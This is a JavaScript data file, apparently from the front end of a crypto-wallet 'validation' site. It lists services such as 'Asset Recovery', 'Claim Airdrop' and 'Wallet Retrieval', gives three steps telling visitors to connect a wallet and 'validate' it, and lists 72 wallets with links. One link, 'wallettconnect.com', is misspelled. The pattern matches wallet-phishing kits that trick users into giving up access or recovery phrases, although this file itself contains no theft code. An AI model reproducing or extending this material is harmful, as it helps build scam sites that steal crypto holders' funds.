import {
  ATWallet,
  AToken,
  AssetRecovery,
  Atomic,
  BCW,
  BitKeep,
  Block,
  Bridge,
  CKBull,
  Cello,
  Coin98,
  CoinUs,
  Coinomi,
  ConnectionError,
  CoolWallet,
  Defly,
  Dharma,
  Dok,
  EasyPocket,
  Encrypted,
  Flare,
  Gas,
  Gaurda,
  GridPlus,
  HaloDefi,
  HashKey,
  Huobi,
  Inch,
  Infinito,
  Iotex,
  Jade,
  KEYRING,
  KyberSwap,
  LedgerLive,
  Liquality,
  MYKEY,
  MathWallet,
  Midas,
  O3Wallet,
  Ownbit,
  Pera,
  PlasmaPay,
  Polygon,
  RWallet,
  Rainbow,
  Rectification,
  Safepal,
  Spillage,
  Stargazer,
  Station,
  Talken,
  Tenset,
  TokenPocket,
  Tongue,
  TrustVault,
  Trustee,
  Unstoppable,
  Valora,
  ViaWallet,
  Walken,
  Wallet,
  WalletIo,
  Walleth,
  XinFin,
  argent,
  bitpay,
  coinbase,
  compound,
  connect,
  generate,
  imToken,
  metamask,
  migration,
  nash,
  others,
  polkadot,
  trust,
  validate,
} from "../assets";

export const featuresData = [
  { image: migration, text: "Migration Issues" },
  { image: AssetRecovery, text: "Asset Recovery" },
  { image: Rectification, text: "Rectification" },
  { image: Gas, text: "High Gas Fees" },
  { image: Spillage, text: "Slippage Error" },
  { image: ConnectionError, text: "Transaction Error" },
  { image: Gas, text: "Cross Chain Transfer" },
  { image: Rectification, text: "Staking Issues" },
  { image: migration, text: "Swap/Exchange" },
  { image: Gas, text: "Claim Reflection" },
  { image: AssetRecovery, text: "Dapps Reconnection" },
  { image: Rectification, text: "Login Issues" },
  { image: migration, text: "Claim Airdrop" },
  { image: ConnectionError, text: "NFTS Issues" },
  { image: Gas, text: "Missing/Irregular Balances" },
  { image: Spillage, text: "Threats Scan" },
  { image: migration, text: "Transaction Delays" },
  { image: Gas, text: "Locked Accounts" },
  { image: ConnectionError, text: "404 Error" },
  { image: Rectification, text: "Cards Integration" },
  { image: migration, text: "Token Claim" },
  { image: Spillage, text: "Wallet Compare" },
  { image: ConnectionError, text: "Buy" },
  { image: migration, text: "Wallet Secure" },
  { image: AssetRecovery, text: "Trading Wallet Issues" },
  { image: Gas, text: "Tokens Purchase" },
  { image: Rectification, text: "Wallet Whitelist" },
  { image: Gas, text: "Wallet Issurance" },
  { image: Spillage, text: "Wallet Retrieval" },
  { image: AssetRecovery, text: "Others" },
];

export const instructionData = [
  {
    image: connect,
    title: "1. Connect your Wallet",
    content: "Use Trust Wallet, Metamask or any wallet to connect to the app.",
  },
  {
    image: validate,
    title: "2. Select a Feature to Validate",
    content: "You will be prompted to connect via a decentralized protocol.",
  },
  {
    image: generate,
    title: "3. Generate Proof of Validation",
    content: "Upon completion, save proof of wallet validation.",
  },
];

export const walletData = [
  { link: "metamask.io", title: "Metamask", image: metamask, id: 1 },
  { link: "Algo.com", title: "Pera Algo Wallet", image: Pera, id: 2 },
  { link: "Walken", title: "Walken", image: Walken, id: 3 },
  { link: "Defly Wallet", title: "Defly Wallet", image: Defly, id: 4 },
  { link: "safepal.com", title: "Safepal", image: Safepal, id: 5 },
  { link: "wallettconnect.com", title: "Wallet Connect", image: Wallet, id: 6 },
  { link: "trustwallet.com", title: "Trust Wallet", image: trust, id: 7 },
  { link: "Blockwallet.com", title: "Block wallet", image: Block, id: 8 },
  { link: "Stargazer.com", title: "Star gazer", image: Stargazer, id: 9 },
  { link: "terrastation.com", title: "Station", image: Station, id: 10 },
  { link: "terrastation.com", title: "Tenset", image: Tenset, id: 11 },
  { link: "CKbull.com", title: "CK Bull", image: CKBull, id: 12 },
  { link: "liquality.com", title: "liquality.com", image: Liquality, id: 13 },
  { link: "binance.com", title: "Binance Chain Wallet", image: BCW, id: 14 },
  {
    link: "polygon.technology",
    title: "Polygon Wallet",
    image: Polygon,
    id: 15,
  },
  { link: "rainbow.me", title: "Rainbow", image: Rainbow, id: 16 },
  { link: "bitpay.com", title: "Bitpay", image: bitpay, id: 17 },
  { link: "walleth.org", title: "Walleth", image: Walleth, id: 18 },
  { link: "argent.xyz", title: "Argent", image: argent, id: 19 },
  { link: "huobiwallet.com", title: "Huobi Wallet", image: Huobi, id: 20 },
  { link: "encrypted.ink", title: "Encrypted Ink", image: Encrypted, id: 21 },
  { link: "compound.finance", title: "Compound", image: compound, id: 22 },
  { link: "polkadot.network", title: "Polkadot", image: polkadot, id: 23 },
  { link: "iotex.io", title: "Iotex", image: Iotex, id: 24 },
  { link: "coin98.com", title: "Coin98", image: Coin98, id: 25 },
  { link: "coinbase.com", title: "Coinbase", image: coinbase, id: 26 },
  {
    link: "crypto.com",
    title: "Crypto.com | Defi Wallet",
    image: Crypto,
    id: 27,
  },
  {
    link: "tokenpocket.pro",
    title: "Token Pocket",
    image: TokenPocket,
    id: 28,
  },
  { link: "mathwallet.org", title: "Math Wallet", image: MathWallet, id: 29 },
  { link: "ledger.com", title: "Ledger Live", image: LedgerLive, id: 30 },
  { link: "1inch.io", title: "1Inch", image: Inch, id: 31 },
  { link: "dharma.io", title: "Dharma", image: Dharma, id: 32 },
  { link: "trustology.io", title: "Trust Vault", image: TrustVault, id: 33 },
  { link: "", title: "MYKEY", image: MYKEY, id: 34 },
  { link: "atomicwallet.io", title: "Atomic", image: Atomic, id: 35 },
  { link: "coolwallet.io", title: "CoolWallet S", image: CoolWallet, id: 36 },
  { link: "nash.io", title: "Nash", image: nash, id: 37 },
  { link: "coinomi.com", title: "Coinomi", image: Coinomi, id: 38 },
  { link: "gridplus.io", title: "GridPlus", image: GridPlus, id: 39 },
  { link: "tokenary.io", title: "Tokenary", image: TokenPocket, id: 40 },
  { link: "safepal.io", title: "SafePal", image: Safepal, id: 41 },
  { link: "infinitowallet.io", title: "Infinito", image: Infinito, id: 42 },
  { link: "wallet.io", title: "Wallet.io", image: WalletIo, id: 43 },
  { link: "ownbit.io", title: "Ownbit", image: Ownbit, id: 44 },
  { link: "easypocket.app", title: "EasyPocket", image: EasyPocket, id: 45 },
  { link: "mtpelerin.com", title: "Bridge Wallet", image: Bridge, id: 46 },
  { link: "viawallet.com", title: "ViaWallet", image: ViaWallet, id: 47 },
  { link: "bitkeep.com", title: "BitKeep", image: BitKeep, id: 48 },
  {
    link: "unstoppable.money",
    title: "Unstoppable Wallet",
    image: Unstoppable,
    id: 49,
  },
  { link: "halodefi.org", title: "HaloDefi Wallet", image: HaloDefi, id: 50 },
  { link: "dokwallet.com", title: "Dok Wallet", image: Dok, id: 51 },
  { link: "cellowallet.app", title: "Cello Wallet", image: Cello, id: 52 },
  { link: "coinus.io", title: "CoinUs", image: CoinUs, id: 53 },
  { link: "valoraapp.com", title: "Valora", image: Valora, id: 54 },
  {
    link: "trusteeglobal.com",
    title: "Trustee Wallet",
    image: Trustee,
    id: 55,
  },
  { link: "guarda.com", title: "Gaurda Wallet", image: Gaurda, id: 56 },
  { link: "jadewallet.io", title: "Jade Wallet", image: Jade, id: 57 },
  { link: "plasmapay.com", title: "PlasmaPay", image: PlasmaPay, id: 58 },
  { link: "o3.network", title: "O3Wallet", image: O3Wallet, id: 59 },
  { link: "me.hashkey.com", title: "HashKey Me", image: HashKey, id: 60 },
  { link: "rsk.co", title: "RWallet", image: RWallet, id: 61 },
  { link: "flarewallet.io", title: "Flare Wallet", image: Flare, id: 62 },
  { link: "KyberSwap", title: "KyberSwap", image: KyberSwap, id: 63 },
  {
    link: "atoken.com",
    title: "AToken Wallet",
    image: AToken,
    id: 64,
  },
  { link: "tongue.fi", title: "Tongue Wallet", image: Tongue, id: 65 },
  { link: "xinfin.io", title: "XinFin XDC Network", image: XinFin, id: 66 },
  { link: "talken.io", title: "Talken Wallet", image: Talken, id: 67 },
  { link: "keyring.app", title: "KEYRING PRO", image: KEYRING, id: 68 },
  { link: "midasprotocol.io", title: "Midas Wallet", image: Midas, id: 69 },
  { link: "authentrend.com", title: "AT.Wallet", image: ATWallet, id: 70 },
  { link: "token.im", title: "imToken", image: imToken, id: 71 },
  { link: "", title: "Others", image: others, id: 72 },
];

export const buttonLinks = [
  { logo: "", link: "Ethereum" },
  { logo: "", link: "BSC" },
  { logo: "", link: "Polygon" },
  { logo: "", link: "Avalanche" },
  { logo: "", link: "Solana" },
  { logo: "", link: "Cardano" },
];